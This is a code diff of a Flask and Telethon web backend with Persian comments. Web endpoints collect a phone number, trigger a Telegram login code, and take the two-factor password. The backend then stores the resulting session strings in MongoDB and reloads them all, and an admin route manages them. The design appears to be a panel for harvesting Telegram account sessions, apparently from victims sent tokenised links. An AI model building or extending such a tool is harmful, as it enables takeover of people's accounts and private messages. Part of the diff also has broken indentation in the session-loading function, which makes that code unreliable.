@@ -76,31 +76,50 @@ def consume_link(token):
     return True
 
 def normalize_phone(phone):
+    # تبدیل به فرمت استاندارد
     phone = phone.strip()
-    if phone.startswith("0"): return "+98" + phone[1:]
-    if phone.startswith("9") and len(phone) == 10: return "+98" + phone
+    if phone.startswith("0"):
+        return "+98" + phone[1:]
+    if phone.startswith("9") and len(phone) == 10:
+        return "+98" + phone
     return phone
 
 def delete_session(phone):
-    path = os.path.join(CONFIG["save_path"], f"{phone}.session")
-    if os.path.exists(path): os.remove(path)
-    sessions_col.delete_one({"phone": phone})
-    client = clients.pop(phone, None)
-    if client:
-        try: client.disconnect()
-        except: pass
+    # حذف فایل و Mongo
+    try:
+        path = os.path.join(CONFIG["save_path"], f"{phone}.session")
+        if os.path.exists(path):
+            os.remove(path)
+        sessions_col.delete_many({"phone": phone})
+        client = clients.pop(phone, None)
+        if client:
+            run_async(client.disconnect())
+    except Exception:
+        pass
 
 def save_session(phone, client):
-    """ذخیره دقیق سشن در MongoDB و فایل"""
+    # ذخیره دقیق سشن
     session_str = client.session.save()
-    file_path = os.path.join(CONFIG["save_path"], f"{phone}.session")
-    with open(file_path, "w", encoding="utf-8") as f:
-        f.write(session_str)
+
+    # Mongo
     sessions_col.update_one(
         {"phone": phone},
-        {"$set": {"session_string": session_str, "enabled": True, "created": datetime.utcnow()}},
+        {"$set": {
+            "phone": phone,
+            "session_string": session_str,
+            "created_at": datetime.utcnow()
+        }},
         upsert=True
     )
+
+    # فایل
+    
+
+    # کلاینت بعد از ذخیره خارج می‌شود
+    if phone in clients:
+        try: run_async(clients[phone].disconnect())
+        except: pass
+        clients.pop(phone)
 
 # ===================== Load Sessions ============================
 
@@ -109,23 +128,34 @@ async def load_all_sessions():
         phone = s["phone"]
         try:
             client = TelegramClient(
-                StringSession(s["session_string"]),
-                CONFIG["api_id"],
-                CONFIG["api_hash"],
-                device_model=CONFIG["device_name"]
-            )
-            
-            clients[phone] = client
+    StringSession(s["session_string"]),
+    CONFIG["api_id"],
+    CONFIG["api_hash"],
+    device_model=CONFIG["device_name"]
+)
+await client.connect()
+clients[phone] = client
             print(f"✅ {phone} فعال شد")
         except Exception as e:
             print(f"❌ مشکل در سشن {phone}: {e}")
 
 # ===================== Client Creation ==========================
 
-async def create_client(phone):
-    c = TelegramClient(os.path.join(CONFIG["save_path"], phone), CONFIG["api_id"], CONFIG["api_hash"], device_model=CONFIG["device_name"])
-    await c.connect()
-    return c
+async def get_client(phone):
+    # اگر قبلاً ساخته شده، همون را برگردان
+    if phone in clients:
+        return clients[phone]
+
+    # ساخت client جدید
+    client = TelegramClient(
+        StringSession(),
+        CONFIG["api_id"],
+        CONFIG["api_hash"],
+        device_model=CONFIG["device_name"]
+    )
+    await client.connect()
+    clients[phone] = client
+    return client
 
 # ===================== Decorators ===============================
 
@@ -904,16 +934,18 @@ def check_phone():
     phone = normalize_phone(request.json["phone"])
     return jsonify(status="exists" if sessions_col.find_one({"phone": phone}) else "ok")
 
-@app.route("/delete_session", methods=["POST"])
-def del_sess():
-    delete_session(normalize_phone(request.json["phone"]))
+@app.route("/admin/delete_session", methods=["POST"])
+@admin_required
+def admin_delete_session():
+    phone = request.json["phone"]
+    delete_session(normalize_phone(phone))
     return jsonify(ok=True)
 
 @app.route("/send_phone", methods=["POST"])
 def send_phone():
     phone = normalize_phone(request.json["phone"])
     async def job():
-        c = await create_client(phone)
+        c = await get_client(phone)
         clients[phone]=c
         await c.send_code_request(phone)
     run_async(job())
@@ -940,7 +972,7 @@ def send_password():
     try:
         run_async(client.sign_in(password=request.json["password"]))
         save_session(phone, client)
-        return jsonify(ok=True)
+        return jsonify(status="ok")
     except Exception as e:
         return jsonify(ok=False, msg=str(e))
 
